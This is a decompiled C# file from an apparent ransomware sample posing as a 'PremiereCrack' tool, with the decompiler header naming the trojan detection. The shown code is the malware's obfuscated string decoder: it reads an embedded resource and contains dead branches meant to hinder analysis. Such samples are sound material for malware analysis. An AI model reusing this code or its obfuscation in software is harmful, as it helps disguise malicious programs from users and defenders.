// Decompiled with JetBrains decompiler
// Type: A.A
// Assembly: PremiereCrack, Version=2.3.77.2, Culture=neutral, PublicKeyToken=null
// MVID: B728F238-A35B-46BB-92FD-55CC50CC96B9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.Win32.Generic-27a1f89ce5a37815010c8411dddec85d5d66e81a957ad722fbd2dc64f99651c8.exe

using System;
using System.Reflection;
using System.Text;

namespace A
{
  internal class A
  {
    internal static readonly byte[] T;

    static A()
    {
      if (A.A.T != null)
        return;
label_1:
      switch (3)
      {
        case 0:
          goto label_1;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (A.A.\u002Ecctor);
          }
          byte[] bytes = Convert.FromBase64String("UHJlbWllcmVDcmFjayQ=");
          string name = Encoding.UTF8.GetString(bytes, 0, bytes.Length);
          A.A.T = W.T(97L, Assembly.GetExecutingAssembly().GetManifestResourceStream(name));
          break;
      }
    }

    internal static string T(int T)
    {
      int count;
      if (((int) A.A.T[T] & 128) == 0)
      {
label_1:
        switch (4)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (A.A.T);
            }
            count = (int) A.A.T[T];
            ++T;
            break;
        }
      }
      else if (((int) A.A.T[T] & 64) == 0)
      {
label_6:
        switch (3)
        {
          case 0:
            goto label_6;
          default:
            count = ((int) A.A.T[T] & -129) << 8 | (int) A.A.T[T + 1];
            T += 2;
            break;
        }
      }
      else
      {
        count = ((int) A.A.T[T] & -193) << 24 | (int) A.A.T[T + 1] << 16 | (int) A.A.T[T + 2] << 8 | (int) A.A.T[T + 3];
        T += 4;
      }
      if (count >= 1)
        return string.Intern(Encoding.Unicode.GetString(A.A.T, T, count));
label_10:
      switch (1)
      {
        case 0:
          goto label_10;
        default:
          return string.Empty;
      }
    }
  }
}
